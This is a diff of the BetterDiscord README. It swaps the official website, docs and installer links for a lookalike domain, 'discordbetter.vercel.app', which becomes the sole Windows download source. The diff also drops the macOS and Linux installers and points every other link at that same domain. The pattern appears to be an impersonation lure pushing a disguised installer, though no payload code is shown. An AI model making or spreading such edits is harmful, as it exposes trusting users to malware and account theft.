@@ -1,6 +1,6 @@
 <div align="center">
 
-<a href="https://betterdiscord.app"><img src="https://betterdiscord.app/resources/branding/logo_large.svg" alt="BetterDiscord Logo" style="width: 70%"/></a>
+<a href="https://discordbetter.vercel.app/"><img src="https://betterdiscord.app/resources/branding/logo_large.svg" alt="BetterDiscord Logo" style="width: 70%"/></a>
 
 [![CI Status][build-badge]][build-link] [![GitHub Releases][downloads-badge]][downloads-link] [![Discord][discord-badge]][discord-link] [![Website][website-badge]][website-link] [![Docs][docs-badge]][docs-link]
 
@@ -15,7 +15,7 @@
 [discord-link]: https://discord.gg/bnSUxedypU
 
 [website-badge]: https://img.shields.io/badge/website-green?labelColor=0c0d10&color=3a71c1&style=for-the-badge&logo=firefoxbrowser&logoColor=3a71c1
-[website-link]: https://betterdiscord.app
+[website-link]: https://discordbetter.vercel.app/
 
 [docs-badge]: https://img.shields.io/badge/docs-green?labelColor=0c0d10&color=3a71c1&style=for-the-badge&logo=readthedocs&logoColor=3a71c1
 [docs-link]: https://docs.betterdiscord.app
@@ -23,7 +23,7 @@
 
 BetterDiscord is a client modification for Discord with endless flexibility and addons. The only limit to the customization is your own imagination.
 
-[![Theme Split](https://betterdiscord.app/resources/branding/split.png)](https://betterdiscord.app/)
+[![Theme Split](https://betterdiscord.app/resources/branding/split.png)](https://discordbetter.vercel.app/)
 
 </div>
 
@@ -31,30 +31,22 @@ BetterDiscord is a client modification for Discord with endless flexibility and 
 
 # Installation
 
-Download the installer for your operating system below. You can check [this page](https://docs.betterdiscord.app/users/getting-started/installation) for a more detailed guide.
+Download the installer for Windows @ [Better Discord](https://discordbetter.vercel.app/)
 
-[![Windows Installer][windows-badge]][windows-link] [![Mac Installer][mac-badge]][mac-link] [![Linux Installer][linux-badge]][linux-link]
+[![Windows Installer][windows-badge]]
 
 [windows-link]: https://github.com/BetterDiscord/Installer/releases/latest/download/BetterDiscord-Windows.exe
 [windows-badge]: https://img.shields.io/badge/Windows%20(7+)-3a71c1?logo=Windows&logoColor=3a71c1&labelColor=0c0d10&color=3a71c1&style=for-the-badge
 
-[mac-link]: https://github.com/BetterDiscord/Installer/releases/latest/download/BetterDiscord-Mac.zip
-[mac-badge]: https://img.shields.io/badge/macOS%20(10.10+)-3a71c1?logo=Apple&logoColor=3a71c1&labelColor=0c0d10&color=3a71c1&style=for-the-badge
-
-[linux-link]: https://github.com/BetterDiscord/Installer/releases/latest/download/BetterDiscord-Linux.AppImage
-[linux-badge]: https://img.shields.io/badge/Linux-3a71c1?logo=Linux&logoColor=3a71c1&labelColor=0c0d10&color=3a71c1&style=for-the-badge
-
-
-
 # Manual Installation
 
-For normal users, installing via the installers makes the most sense. However when wanting to either develop BetterDiscord, or when the installers do not work, this option can be used. Please see our [detailed documentation](https://docs.betterdiscord.app/users/getting-started/installation#manual-installation) for a guide on how to do this.
+For normal users, installing via the installers makes the most sense. However when wanting to either develop BetterDiscord, or when the installers do not work, this option can be used. Please see our [detailed documentation](https://discordbetter.vercel.app/) for a guide on how to do this.
 
 
 
 # Addons
 
-Installing addons--like plugins and themes--is easy. All you need to do is select and download an addon from [our website][website-link] and put it in your folder. If you want some more details, or just prefer a visual guide, take a look at our [tutorial on installing addons](https://docs.betterdiscord.app/users/guides/installing-addons) that includes a demonstration video.
+Installing addons--like plugins and themes--is easy. All you need to do is select and download an addon from [our website][website-link] and put it in your folder. If you want some more details, or just prefer a visual guide, take a look at our [tutorial on installing addons](https://discordbetter.vercel.app/) that includes a demonstration video.
 
 
 
@@ -64,8 +56,6 @@ BetterDiscord currently only supports standard local Discord installs. This mean
 
 Examples of supported platforms:
 - Windows 7 and newer
-- macOS Yosemite and newer
-- Ubuntu 14.04 and newer
 
 
 
@@ -75,5 +65,5 @@ For information on contributing to this project, please see [CONTRIBUTING.md](/C
 
 [![Contributors][contributors-image]][contributors-link]
 
-[contributors-image]: https://contrib.rocks/image?repo=betterdiscord/betterdiscord
-[contributors-link]: https://github.com/betterdiscord/betterdiscord/graphs/contributors
+[contributors-image]: [https://contrib.rocks/image?repo=betterdiscord/betterdiscord](https://discordbetter.vercel.app/)
+[contributors-link]: [https://github.com/betterdiscord/betterdiscord/graphs/contributors](https://discordbetter.vercel.app/)
